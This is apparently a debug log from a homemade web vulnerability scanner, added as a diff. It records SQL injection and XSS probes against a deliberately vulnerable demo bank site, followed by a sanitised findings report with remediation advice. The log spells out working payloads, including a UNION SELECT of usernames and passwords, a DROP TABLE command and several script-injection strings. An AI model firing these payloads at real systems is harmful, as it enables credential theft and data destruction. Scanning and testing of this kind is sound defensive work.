@@ -1,0 +1,332 @@
+2025-08-04 19:50:29,570 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:30,776 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "HEAD / HTTP/1.1" 200 0
+2025-08-04 19:50:30,784 - root - DEBUG - Domain check for https://demo.testfire.net: Status 200
+2025-08-04 19:50:30,790 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:31,929 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET / HTTP/1.1" 200 None
+2025-08-04 19:50:31,941 - root - DEBUG - Found 1 forms at https://demo.testfire.net for SQLi scan
+2025-08-04 19:50:31,941 - root - DEBUG - Form at https://demo.testfire.net/search.jsp: Method=get, Params={'query': ''}
+2025-08-04 19:50:31,951 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:33,020 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27+OR+%271%27%3D%271%27+-- HTTP/1.1" 200 7020
+2025-08-04 19:50:33,020 - root - DEBUG - Tested SQLi payload ' OR '1'='1' -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.07s
+2025-08-04 19:50:33,020 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:34,170 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=1%27+OR+%271%27%3D%271%27+-- HTTP/1.1" 200 7021
+2025-08-04 19:50:34,172 - root - DEBUG - Tested SQLi payload 1' OR '1'='1' -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.15s
+2025-08-04 19:50:34,178 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:35,283 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL+-- HTTP/1.1" 200 7039
+2025-08-04 19:50:35,283 - root - DEBUG - Tested SQLi payload ' UNION SELECT NULL, NULL, NULL -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.11s
+2025-08-04 19:50:35,290 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:36,414 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=1%27+UNION+SELECT+username%2C+password+FROM+users+-- HTTP/1.1" 200 7053
+2025-08-04 19:50:36,416 - root - DEBUG - Tested SQLi payload 1' UNION SELECT username, password FROM users -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.13s
+2025-08-04 19:50:36,425 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:37,599 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27+OR+SLEEP%285%29+-- HTTP/1.1" 200 7021
+2025-08-04 19:50:37,600 - root - DEBUG - Tested SQLi payload ' OR SLEEP(5) -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.18s
+2025-08-04 19:50:37,610 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:38,683 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=1%3B+DROP+TABLE+users%3B+-- HTTP/1.1" 200 7028
+2025-08-04 19:50:38,683 - root - DEBUG - Tested SQLi payload 1; DROP TABLE users; -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.08s
+2025-08-04 19:50:38,690 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:39,816 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27+AND+1%3D0+UNION+SELECT+NULL%2C+version%28%29+-- HTTP/1.1" 200 7046
+2025-08-04 19:50:39,820 - root - DEBUG - Tested SQLi payload ' AND 1=0 UNION SELECT NULL, version() -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.14s
+2025-08-04 19:50:39,832 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:40,950 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+-- HTTP/1.1" 200 7040
+2025-08-04 19:50:40,950 - root - DEBUG - Tested SQLi payload ' OR EXISTS(SELECT * FROM users) -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.13s
+2025-08-04 19:50:40,962 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:42,050 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.tables%29+%3E+0+-- HTTP/1.1" 200 7067
+2025-08-04 19:50:42,050 - root - DEBUG - Tested SQLi payload 1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.09s
+2025-08-04 19:50:42,062 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:43,131 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27+OR+1%3D1+LIMIT+1+OFFSET+0+-- HTTP/1.1" 200 7033
+2025-08-04 19:50:43,133 - root - DEBUG - Tested SQLi payload ' OR 1=1 LIMIT 1 OFFSET 0 -- on https://demo.testfire.net/search.jsp: Status 200, Time 1.07s
+2025-08-04 19:50:43,135 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:44,234 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET / HTTP/1.1" 200 None
+2025-08-04 19:50:44,240 - root - DEBUG - Found 1 forms at https://demo.testfire.net
+2025-08-04 19:50:44,240 - root - DEBUG - Form at https://demo.testfire.net/search.jsp: Method=get, Params={'query': ''}
+2025-08-04 19:50:44,245 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:45,336 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1" 200 7034
+2025-08-04 19:50:45,336 - root - DEBUG - Tested payload <script>alert('XSS')</script> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:45,338 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:46,480 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 200 7037
+2025-08-04 19:50:46,482 - root - DEBUG - Tested payload <img src=x onerror=alert('XSS')> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:46,483 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:47,622 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=javascript%3Aalert%28%27XSS%27%29 HTTP/1.1" 200 7028
+2025-08-04 19:50:47,622 - root - DEBUG - Tested payload javascript:alert('XSS') on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:47,622 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:48,750 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1" 200 7036
+2025-08-04 19:50:48,750 - root - DEBUG - Tested payload '><script>alert('XSS')</script> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:48,750 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:49,820 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 200 7030
+2025-08-04 19:50:49,820 - root - DEBUG - Tested payload <svg onload=alert('XSS')> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:49,820 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:50,900 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 200 7031
+2025-08-04 19:50:50,900 - root - DEBUG - Tested payload <body onload=alert('XSS')> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:50,900 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:52,070 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Cinput+value%3D%27XSS%27+onfocus%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 200 7045
+2025-08-04 19:50:52,070 - root - DEBUG - Tested payload <input value='XSS' onfocus=alert('XSS')> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:52,070 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:53,181 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Ca+href%3D%27javascript%3Aalert%28%22XSS%22%29%27%3EClick%3C%2Fa%3E HTTP/1.1" 200 7048
+2025-08-04 19:50:53,181 - root - DEBUG - Tested payload <a href='javascript:alert("XSS")'>Click</a> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:53,181 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:54,285 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Ciframe+src%3D%27javascript%3Aalert%28%22XSS%22%29%27%3E HTTP/1.1" 200 7043
+2025-08-04 19:50:54,285 - root - DEBUG - Tested payload <iframe src='javascript:alert("XSS")'> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:54,285 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:55,383 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 200 7023
+2025-08-04 19:50:55,385 - root - DEBUG - Tested payload '';!--"<XSS>=&{()} on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:55,385 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:56,445 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Cscript%3Edocument.write%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1" 200 7043
+2025-08-04 19:50:56,448 - root - DEBUG - Tested payload <script>document.write('XSS')</script> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:56,450 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:57,526 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET /search.jsp?query=%3Cimg+src%3D%27javascript%3Aalert%28%22XSS%22%29%27%3E HTTP/1.1" 200 7040
+2025-08-04 19:50:57,526 - root - DEBUG - Tested payload <img src='javascript:alert("XSS")'> on https://demo.testfire.net/search.jsp: Status 200
+2025-08-04 19:50:57,526 - root - INFO - Completed XSS scan for https://demo.testfire.net
+2025-08-04 19:50:57,531 - urllib3.connectionpool - DEBUG - Starting new HTTPS connection (1): demo.testfire.net:443
+2025-08-04 19:50:58,650 - urllib3.connectionpool - DEBUG - https://demo.testfire.net:443 "GET / HTTP/1.1" 200 None
+2025-08-04 19:50:58,657 - root - DEBUG - Found 1 forms for CSRF scan at https://demo.testfire.net
+2025-08-04 19:50:58,657 - root - ERROR - Scan error: 'str' object has no attribute 'get'
+2025-08-04 19:50:58,660 - root - INFO - Found 13 vulnerabilities for https://demo.testfire.net
+2025-08-04 19:50:58,661 - root - WARNING - Config file not found at C:\Users\lenovo\Desktop\aegis-digital-umbrella-main (2)\aegis-digital-umbrella-main\backend\.emergent
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: https://demo.testfire.net
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: Union-based SQL injection vulnerability detected with payload: 1' UNION SELECT username, password FROM users --
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: Union-based SQL injection vulnerability detected with payload: 1&#x27; UNION SELECT username, password FROM users --
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: Potential data leakage in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: Potential data leakage in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: Restrict database permissions and use parameterized queries
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: Restrict database permissions and use parameterized queries
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <script>alert('XSS')</script>
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: alert(&#x27;XSS&#x27;)
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,793 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <img src=x onerror=alert('XSS')>
+2025-08-04 19:51:23,793 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: 
+2025-08-04 19:51:23,800 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,800 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,800 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,800 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: javascript:alert('XSS')
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: javascript:alert(&#x27;XSS&#x27;)
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: '><script>alert('XSS')</script>
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: &#x27;&gt;alert(&#x27;XSS&#x27;)
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <svg onload=alert('XSS')>
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: 
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <body onload=alert('XSS')>
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: 
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,801 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <input value='XSS' onfocus=alert('XSS')>
+2025-08-04 19:51:23,810 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: 
+2025-08-04 19:51:23,810 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,810 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,810 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,811 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,813 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,813 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,813 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <a href='javascript:alert("XSS")'>Click</a>
+2025-08-04 19:51:23,813 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: Click
+2025-08-04 19:51:23,815 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,816 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,816 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,816 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,817 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,817 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,818 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <iframe src='javascript:alert("XSS")'>
+2025-08-04 19:51:23,820 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: 
+2025-08-04 19:51:23,820 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,820 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,820 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,821 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,822 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,823 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,823 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: '';!--"<XSS>=&{()}
+2025-08-04 19:51:23,825 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: &#x27;&#x27;;!--&quot;=&amp;{()}
+2025-08-04 19:51:23,825 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,826 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,826 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,826 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,829 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,830 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,830 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <script>document.write('XSS')</script>
+2025-08-04 19:51:23,830 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: document.write(&#x27;XSS&#x27;)
+2025-08-04 19:51:23,830 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,830 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,831 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,831 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,832 - server - DEBUG - Raw text before sanitization: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,832 - server - DEBUG - Sanitized text: https://demo.testfire.net/search.jsp
+2025-08-04 19:51:23,832 - server - DEBUG - Raw text before sanitization: Reflected XSS vulnerability detected with payload: <img src='javascript:alert("XSS")'>
+2025-08-04 19:51:23,835 - server - DEBUG - Sanitized text: Reflected XSS vulnerability detected with payload: 
+2025-08-04 19:51:23,835 - server - DEBUG - Raw text before sanitization: Payload reflected in response: 
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<
+2025-08-04 19:51:23,835 - server - DEBUG - Sanitized text: Payload reflected in response:                 &lt;html xmlns=&quot;http://www.w3.org/1...
+2025-08-04 19:51:23,837 - server - DEBUG - Raw text before sanitization: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,837 - server - DEBUG - Sanitized text: Implement output encoding (e.g., HTML escape), Content Security Policy, and input validation
+2025-08-04 19:51:23,837 - server - DEBUG - Raw text before sanitization: Immediate Fix for High-Severity Issue (SQL Injection):**
+2025-08-04 19:51:23,837 - server - DEBUG - Sanitized text: Immediate Fix for High-Severity Issue (SQL Injection):**
+2025-08-04 19:51:23,837 - server - DEBUG - Raw text before sanitization: Recommendation:** Immediately disable or remove the `search.jsp` page until the SQL injection vulnerability is fully remediated. This prevents unauthorized access to the database.  A temporary placeho
+2025-08-04 19:51:23,837 - server - DEBUG - Sanitized text: Recommendation:** Immediately disable or remove the `search.jsp` page until the SQL injection vulnerability is fully remediated. This prevents unauthorized access to the database.  A temporary placeho
+2025-08-04 19:51:23,839 - server - DEBUG - Raw text before sanitization: Input Validation and Sanitization Strategies (for both SQLi and XSS):**
+2025-08-04 19:51:23,839 - server - DEBUG - Sanitized text: Input Validation and Sanitization Strategies (for both SQLi and XSS):**
+2025-08-04 19:51:23,839 - server - DEBUG - Raw text before sanitization: Recommendation:** Implement parameterized queries (prepared statements) for all database interactions. This prevents SQL injection by treating user inputs as data, not executable code.  For languages 
+2025-08-04 19:51:23,839 - server - DEBUG - Sanitized text: Recommendation:** Implement parameterized queries (prepared statements) for all database interactions. This prevents SQL injection by treating user inputs as data, not executable code.  For languages 
+2025-08-04 19:51:23,840 - server - DEBUG - Raw text before sanitization: Recommendation:**  For all user inputs received by `search.jsp` (and all other input points), perform robust input validation *before* processing. This should include:
+2025-08-04 19:51:23,840 - server - DEBUG - Sanitized text: Recommendation:**  For all user inputs received by `search.jsp` (and all other input points), perform robust input validation *before* processing. This should include:
